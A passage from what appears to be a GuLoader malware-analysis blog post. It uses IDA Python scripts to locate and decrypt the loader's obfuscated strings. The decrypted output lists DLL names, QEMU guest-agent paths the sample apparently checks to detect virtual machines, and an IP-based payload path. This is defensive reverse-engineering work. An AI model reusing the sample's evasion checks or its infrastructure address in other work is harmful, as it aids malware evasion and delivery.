    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">decrypt</span><span class="p">(</span><span class="mh">0x147F1</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">



<div class="output_text output_subarea output_execute_result">
<pre>'psapi.dll'</pre>
</div>

</div>

</div>
</div>

</div>
    

<div class="cell border-box-sizing text_cell rendered">
<div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h4 id="IDA-Script-to-Find-Encrypted-String-Functions">
<a class="anchor" href="#IDA-Script-to-Find-Encrypted-String-Functions" aria-hidden="true"><span class="octicon octicon-link"></span></a>IDA Script to Find Encrypted String Functions<a class="anchor-link" href="#IDA-Script-to-Find-Encrypted-String-Functions"> </a>
</h4>
<p>We know that the string data function is the last function call before the string decryption function calls so we can just use xrefs to the decryption functions then search backwards for the string data function call.</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">test2</span><span class="p">():</span>
    <span class="n">f</span> <span class="o">=</span> <span class="n">ida_funcs</span><span class="o">.</span><span class="n">get_func</span><span class="p">(</span><span class="mh">0x08268980</span><span class="p">)</span>
    <span class="n">fc</span> <span class="o">=</span> <span class="n">FlowChart</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">FC_PREDS</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">fc</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Basic Block: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">start_ea</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">"------------------------------------"</span><span class="p">)</span>
        <span class="c1"># grab the last two instructions in the block </span>
        <span class="n">last_inst</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">end_ea</span><span class="p">)</span>
        <span class="n">penultimate_inst</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">last_inst</span><span class="p">)</span>
        <span class="n">ea</span> <span class="o">=</span> <span class="n">block</span><span class="o">.</span><span class="n">start_ea</span>
        <span class="k">while</span> <span class="n">ea</span> <span class="o">&lt;</span> <span class="n">block</span><span class="o">.</span><span class="n">end_ea</span><span class="p">:</span>
            <span class="n">dLine</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">generate_disasm_line</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span><span class="si">}</span><span class="s2">: "</span> <span class="o">+</span> <span class="n">dLine</span><span class="p">)</span>
            <span class="n">ea</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">next_head</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span> 


<span class="k">def</span> <span class="nf">get_string_fn</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">):</span>
    <span class="n">out</span> <span class="o">=</span> <span class="kc">None</span>
    <span class="n">limt_count</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">limt_count</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">:</span>
        <span class="n">ptr_addr</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">prev_head</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">is_code</span><span class="p">(</span><span class="n">ida_bytes</span><span class="o">.</span><span class="n">get_full_flags</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)):</span>
            <span class="k">if</span> <span class="n">idc</span><span class="o">.</span><span class="n">print_insn_mnem</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">)</span> <span class="o">==</span> <span class="s1">'call'</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
                <span class="n">out</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ptr_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
                <span class="k">break</span>
        <span class="n">limt_count</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">out</span>


<span class="k">def</span> <span class="nf">get_xref_list</span><span class="p">(</span><span class="n">fn_addr</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">addr</span><span class="o">.</span><span class="n">frm</span> <span class="k">for</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">idautils</span><span class="o">.</span><span class="n">XrefsTo</span><span class="p">(</span><span class="n">fn_addr</span><span class="p">)]</span>

<span class="n">xref_list</span> <span class="o">=</span> <span class="n">get_xref_list</span><span class="p">(</span><span class="mh">0x025A28</span><span class="p">)</span>
<span class="n">str_fn_list</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">xref</span> <span class="ow">in</span> <span class="n">xref_list</span><span class="p">:</span>
    <span class="n">str_fn</span> <span class="o">=</span> <span class="n">get_string_fn</span><span class="p">(</span><span class="n">xref</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">str_fn</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
        <span class="n">str_fn_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">str_fn</span><span class="p">)</span>
</pre></div>

</div>
</div>
</div>
    
    
<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">str_fn_list</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x254d4</span><span class="p">,</span> <span class="mh">0x1644a</span><span class="p">,</span> <span class="mh">0x147f1</span><span class="p">,</span> <span class="mh">0x1607f</span><span class="p">,</span> <span class="mh">0x1d6a4</span><span class="p">,</span> <span class="mh">0x1be3d</span><span class="p">,</span> <span class="mh">0x1babc</span><span class="p">,</span> <span class="mh">0x1836d</span><span class="p">,</span> <span class="mh">0x8a55</span><span class="p">,</span> <span class="mh">0x8d44</span><span class="p">,</span> <span class="mh">0x670f</span><span class="p">,</span> <span class="mh">0x4270</span><span class="p">,</span> <span class="mh">0xac35</span><span class="p">,</span> <span class="mh">0xaab1</span><span class="p">,</span> <span class="mh">0x8f89</span><span class="p">,</span> <span class="mh">0x9d9c</span><span class="p">,</span> <span class="mh">0x1d9d3</span><span class="p">,</span> <span class="mh">0x14d18</span><span class="p">,</span> <span class="mh">0x18aa1</span><span class="p">,</span> <span class="mh">0x19765</span><span class="p">,</span> <span class="mh">0x1a31c</span><span class="p">,</span> <span class="mh">0x1ae60</span><span class="p">,</span> <span class="mh">0x17571</span><span class="p">,</span> <span class="mh">0x18f33</span><span class="p">,</span> <span class="mh">0x192f4</span><span class="p">,</span> <span class="mh">0x17de0</span><span class="p">,</span> <span class="mh">0x15b41</span><span class="p">,</span> <span class="mh">0x14d35</span><span class="p">,</span> <span class="mh">0x167d4</span><span class="p">,</span> <span class="mh">0x171af</span><span class="p">,</span> <span class="mh">0x16e4f</span><span class="p">,</span> <span class="mh">0x1cf67</span><span class="p">,</span> <span class="mh">0x1c943</span><span class="p">,</span> <span class="mh">0x17aa1</span><span class="p">]</span>

<span class="k">for</span> <span class="n">str_fn</span> <span class="ow">in</span> <span class="n">str_fn_list</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="n">str_fn</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">

<div class="output_subarea output_stream output_stdout output_text">
<pre>user32
psapi.dll
Msi.dll
Publisher
Skattekister138
OverOps146.70.147.12/vSFjv98.fla
SOFTWARE\AppDataLow\
Tumorlike



ProgramFiles=
windir=
\system32\
\syswow64\
iertutil.dll
wininet.dll
KERNELBASE.DLL
shell32
advapi32
C:\Program Files\Qemu-ga\qemu-ga.exe
C:\Program Files\qga\qga.exe
TEMP=
</pre>
</div>
</div>

</div>
</div>

</div>
    

</div>



  </div><a class="u-url" href="/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
      </div>
      <div class="footer-col">
        <p></p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
